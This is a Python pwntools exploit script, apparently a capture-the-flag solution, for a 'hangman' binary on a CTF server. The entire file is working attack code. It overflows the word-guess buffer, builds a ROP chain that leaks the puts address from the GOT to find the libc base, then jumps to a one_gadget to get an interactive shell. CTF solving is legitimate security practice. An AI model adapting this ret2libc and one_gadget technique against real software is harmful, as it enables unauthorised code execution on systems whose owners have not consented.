from pwn import *
import sys

context.clear(os='linux', arch='amd64')
# context.log_level='debug'

__author__ = 'yuvaly0'

argv = sys.argv
binary_path = './hangman'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('challenges1.hexionteam.com', 3000)
else:
	sh = process([binary_path])

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')


if DEBUG:
	gdb.attach(sh, '''
		b* gameLoop+494
		c
		''')

e = ELF(binary_path)

# ------------- plan -----------
# overflow and leak puts got address
# jump to one gadget

def guess_word(word, clean_buffer=False):
	sh.sendlineafter('Enter choice: ', '2')
	sh.sendlineafter('Enter word: ', word)
	if clean_buffer:
		sh.sendlineafter('Enter choice: ', '10') # clean buffer


buffer_length = 32
payload = 'A' * buffer_length + 'z'
guess_word(payload, clean_buffer=True)

overflow_offset = 64
pop_rdi_ret = 0x4019a3
puts_got = e.got['puts']
puts_plt = e.sym['puts']
game_loop = e.sym['gameLoop']
payload = 'A' * overflow_offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +  p64(game_loop)
guess_word(payload)


sh.recvuntil('Wrong...\n')
leak = u64(sh.recvline(keepends=False).ljust(8, '\x00'))
libc.address = leak - libc.sym['_IO_puts']
log.info('libc base: {}'.format(hex(libc.address)))


payload = 'A' * buffer_length + 'z'
guess_word(payload, clean_buffer=True)

one_gadget_offset = 0x10a38c
payload = 'A' * overflow_offset + p64(libc.address + one_gadget_offset)
guess_word(payload)

sh.interactive()


